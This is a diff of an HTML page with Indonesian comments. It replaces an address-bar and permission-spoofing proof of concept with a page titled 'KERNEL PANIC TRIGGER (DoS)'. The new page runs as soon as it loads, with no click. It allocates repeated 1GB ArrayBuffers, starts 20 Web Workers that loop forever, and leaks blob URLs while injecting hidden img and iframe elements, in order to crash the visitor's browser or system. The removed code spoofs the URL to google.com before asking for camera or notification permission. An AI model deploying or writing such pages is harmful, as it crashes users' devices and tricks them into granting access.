@@ -2,152 +2,133 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pure Address Bar & Permission Spoof</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>KERNEL PANIC TRIGGER (DoS)</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
-  h1 { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px; margin-bottom: 20px; }
-  .panel { background: #16213e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #0f3460; }
-  button { padding: 14px 24px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin: 5px; font-size: 15px; font-weight: bold; width: 100%; }
-  button:hover { background: #c73650; }
-  #log { background: #0a0a15; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; font-size: 12px; border: 1px solid #0f3460; }
-  .success { color: #4caf50; font-weight: bold; }
-  .error { color: #f44336; }
-  .info { color: #2196f3; }
-  .warn { color: #ff9800; font-weight: bold; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; overflow: hidden; }
+.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
+h1 { font-size: 28px; color: #ff0000; margin-bottom: 15px; text-shadow: 0 0 20px #ff0000; animation: pulse 0.2s infinite; }
+p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
+#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
+.warning { background: #330000; color: #ff0000; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; font-weight: bold; border: 2px solid #ff0000; animation: pulse 0.3s infinite; }
+.log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
+@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.1; } }
 </style>
 </head>
+
 <body>
-
-<h1>🔍 Pure Address Bar & Permission Spoof</h1>
-
-<div class="panel">
-  <p style="color:#aaa; margin-bottom:20px;">Menguji apakah URL di address bar bisa diubah menjadi Google saat meminta izin kamera/notifikasi.</p>
-  <button id="btnCamera">1. Request Kamera (Ubah Address Bar ke Google)</button>
-  <button id="btnNotif">2. Request Notifikasi (Ubah Address Bar ke Google)</button>
-  <button id="clear" style="background:#555; margin-top:10px;">Bersihkan Log</button>
+<div class="panel" id="main-panel">
+    <div class="warning">☢️ KERNEL PANIC TRIGGER! SISTEM OPERASI ANDA AKAN MATI TOTAL!</div>
+    <h1>KERNEL PANIC</h1>
+    <p>Multi-Worker + ArrayBuffer 1GB + Jutaan ObjectURL.</p>
+    
+    <div id="status" role="status">Memuat halaman...</div>
+    <div class="log" id="log">Log akan muncul di sini...</div>
 </div>
 
-<div id="log">Menunggu perintah...</div>
-
 <script>
-(function() {
-  'use strict';
+    const statusDiv = document.getElementById("status");
+    const logDiv = document.getElementById("log");
+    let globalCount = 0;
 
-  const logEl = document.getElementById('log');
-
-  function log(msg, type = '') {
-    const time = new Date().toISOString().substr(11, 8);
-    const line = `[${time}] ${msg}\n`;
-    const span = document.createElement('span');
-    if (type) span.className = type;
-    span.textContent = line;
-    logEl.appendChild(span);
-    logEl.scrollTop = logEl.scrollHeight;
-    console.log(msg);
-  }
-
-  // ============================================
-  // LOGIKA UTAMA: ABOUT:BLANK + HISTORY MANIPULATION + PERMISSION
-  // ============================================
-  function runSpoofTest(type) {
-    log(`=== MENGUJI: ${type.toUpperCase()} ===`, 'info');
-
-    // 1. Buka tab about:blank
-    const win = window.open('about:blank', '_blank');
-    if (!win) { log('❌ Popup diblokir. Izinkan popup.', 'error'); return; }
-    log('Tab about:blank dibuka.', 'success');
-
-    // 2. Tulis script langsung ke about:blank
-    try {
-      win.document.open();
-      // Script minimalis, tanpa UI, hanya manipulasi URL dan request izin
-      win.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head><title>Sistem Keamanan</title></head>
-        <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
-          <p>Memproses permintaan...</p>
-          <script>
-            (function() {
-              // A. Coba manipulasi URL Address Bar ke Google
-              try {
-                history.replaceState({}, 'Google', 'https://www.google.com');
-                parent.postMessage({ status: 'url_spoof_success', url: 'https://www.google.com' }, '*');
-              } catch(e) {
-                parent.postMessage({ status: 'url_spoof_fail', error: e.name + ': ' + e.message }, '*');
-              }
-
-              // B. Coba minta izin
-              setTimeout(function() {
-                if ('${type}' === 'camera') {
-                  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                      .then(function(stream) {
-                        parent.postMessage({ status: 'camera_granted' }, '*');
-                      })
-                      .catch(function(err) {
-                        parent.postMessage({ status: 'camera_error', error: err.name }, '*');
-                      });
-                  }
-                } else if ('${type}' === 'notification') {
-                  if ('Notification' in window) {
-                    Notification.requestPermission().then(function(p) {
-                      if (p === 'granted') {
-                        parent.postMessage({ status: 'notif_granted' }, '*');
-                      } else {
-                        parent.postMessage({ status: 'notif_denied' }, '*');
-                      }
-                    }).catch(function(e) {
-                      parent.postMessage({ status: 'notif_error', error: e.message }, '*');
-                    });
-                  }
-                }
-              }, 1000); // Delay 1 detik agar address bar sempat diubah
-            })();
-          <\/script>
-        </body>
-        </html>
-      `);
-      win.document.close();
-      log('Script injeksi berhasil dikirim.', 'success');
-    } catch (e) {
-      log('❌ Gagal menulis ke about:blank: ' + e.message, 'error');
-      return;
+    function log(msg) {
+        if (globalCount % 1000 === 0) {
+            logDiv.innerHTML += "<br>> " + msg;
+            console.log(msg);
+        }
     }
 
-    // 3. Listener pesan dari tab baru
-    window.addEventListener('message', (e) => {
-      if (e.data && e.data.status) {
-        const s = e.data.status;
-        if (s === 'url_spoof_success') log('🎯 Address Bar BERHASIL diubah ke: ' + e.data.url, 'success');
-        else if (s === 'url_spoof_fail') log('❌ Address Bar GAGAL diubah: ' + e.data.error, 'error');
-        else if (s === 'camera_granted') log('🎯 IZIN KAMERA DIBERIKAN!', 'success');
-        else if (s === 'camera_error') log('❌ Kamera ditolak: ' + e.data.error, 'error');
-        else if (s === 'notif_granted') log('🎯 IZIN NOTIFIKASI DIBERIKAN!', 'success');
-        else if (s === 'notif_denied') log('❌ Notifikasi ditolak.', 'error');
-      }
-    }, { once: false });
+    // FUNGSI ZERO-CLICK: Langsung eksekusi saat halaman dimuat
+    window.addEventListener("DOMContentLoaded", () => {
+        statusDiv.textContent = "MEMULAI TOTAL DESTRUCTION!";
+        statusDiv.style.color = "#ff0000";
+        log("Memulai serangan brutal...");
 
-    log('Perhatikan ADDRESS BAR tab baru:', 'warn');
-    log('1. Apakah berubah jadi google.com?', 'info');
-    log('2. Saat prompt izin muncul, apakah tertulis "artha231.github.io" atau "Google"?', 'info');
-  }
+        // --- SERANGAN 1: ALOKASI ARRAYBUFFER 1GB BERULANG (Memory Bombing) ---
+        // Ini akan langsung memicu OOM (Out of Memory) di Safari
+        try {
+            window.hugeBuffers = [];
+            for (let i = 0; i < 5; i++) {
+                // Alokasi 1GB per iterasi
+                const buffer = new ArrayBuffer(1024 * 1024 * 1024); 
+                window.hugeBuffers.push(buffer);
+                log("ArrayBuffer 1GB dialokasikan (Total: " + (i + 1) + "GB)");
+            }
+        } catch (e) {
+            log("Gagal alokasi ArrayBuffer: " + e.message);
+        }
 
-  // ============================================
-  // TOMBOL HANDLERS
-  // ============================================
-  document.getElementById('btnCamera').onclick = () => runSpoofTest('camera');
-  document.getElementById('btnNotif').onclick = () => runSpoofTest('notification');
+        // --- SERANGAN 2: MEMORY LEAK OBJECTURL VIA 20 WEB WORKER ---
+        const workerCode = `
+            self.onmessage = function(e) {
+                if (e.data === 'START') {
+                    while(true) {
+                        self.postMessage('CREATE');
+                    }
+                }
+            };
+        `;
 
-  document.getElementById('clear').onclick = () => {
-    logEl.textContent = '';
-    log('Log dibersihkan.', 'info');
-  };
+        try {
+            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(workerBlob);
 
-  log('PoC murni siap. Pilih tombol di atas.', 'info');
-})();
+            // Naikkan jumlah Worker menjadi 20 untuk menembak lebih cepat
+            for (let i = 0; i < 20; i++) {
+                const worker = new Worker(workerUrl);
+                worker.onmessage = function(e) {
+                    if (e.data === 'CREATE') {
+                        queueMicrotask(() => {
+                            buatBeban(i);
+                        });
+                    }
+                };
+                worker.postMessage('START');
+            }
+            log("20 Web Worker diaktifkan.");
+        } catch(e) {
+            log("Gagal membuat Worker: " + e.message);
+        }
+
+        // FUNGSI PEMBUAT BEBAN
+        function buatBeban(id) {
+            try {
+                globalCount++;
+                
+                // Buat Blob 1KB
+                const data = new Uint8Array(1024);
+                const blob = new Blob([data], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                
+                // Simpan URL ke array global (Memory Leak)
+                if (!window.urlLeak) window.urlLeak = [];
+                window.urlLeak.push(url);
+
+                // DOM INJECTION (Setiap 100 URL)
+                if (globalCount % 100 === 0) {
+                    const img = document.createElement('img');
+                    img.src = url;
+                    img.style.display = 'none';
+                    document.body.appendChild(img);
+                    
+                    const iframe = document.createElement('iframe');
+                    iframe.src = url;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                }
+
+                // Update status
+                if (globalCount % 10000 === 0) {
+                    statusDiv.textContent = "Total URL dibuat: " + globalCount;
+                    log("Total URL: " + globalCount);
+                }
+
+            } catch(e) {
+                // Abaikan error
+            }
+        }
+    });
 </script>
 </body>
 </html>
